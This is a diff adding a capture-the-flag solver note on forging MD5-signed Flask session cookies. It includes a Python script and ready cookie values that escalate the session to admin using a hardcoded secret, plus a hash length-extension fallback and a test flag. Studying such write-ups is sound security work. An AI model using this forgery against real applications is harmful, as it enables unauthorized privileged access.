@@ -1514,6 +1514,49 @@ Solver lesson:
 - It should enumerate likely usernames only from in-scope page evidence such as author names and email addresses.
 - Report the bug as auth bypass/IDOR-like token forgery, not password cracking.
 
+### Lost In Translation: MD5-Signed Cookie Forgery
+
+Category:
+
+- Web auth logic / weak session signature.
+
+Signal:
+
+- Flask source stores `session` as hex-encoded `key=value&...` data and `sig` as `MD5(SECRET || session_data)`.
+- `SECRET = b"secret_change_me"` is hardcoded in the distributed source.
+- The app parses session data into a dict and admin access only checks whether `role=admin`.
+
+Shortest path:
+
+```python
+import hashlib
+
+secret = b"secret_change_me"
+session = b"user=traveler&role=admin"
+print("session=" + session.hex())
+print("sig=" + hashlib.md5(secret + session).hexdigest())
+```
+
+Set the two cookies, then visit `/`:
+
+```text
+session=757365723d74726176656c657226726f6c653d61646d696e
+sig=5af63a8a3f72db1a9c41d57a9aa2bf05
+```
+
+If the remote build hides the secret but still signs `MD5(secret || data)`, use MD5 length extension against a normal cookie such as `user=<name>&role=guest`, append `&role=admin`, hex-encode the extended bytes, and use the forged digest as `sig`.
+
+Local test flag:
+
+```text
+SVIUSCG{t3st_fl4g}
+```
+
+Solver lesson:
+
+- WebSolver should flag raw MD5/SHA1 prefix MACs as forgeable. If the secret is present in source, generate a direct resign payload; otherwise generate a hash length-extension payload.
+- Session parsers that split `key=value&...` and overwrite duplicate keys make appended `&role=admin` style payloads especially valuable.
+
 ### Lingual Janet: Sandbox Load-Order File Read Side Channel
 
 Category:
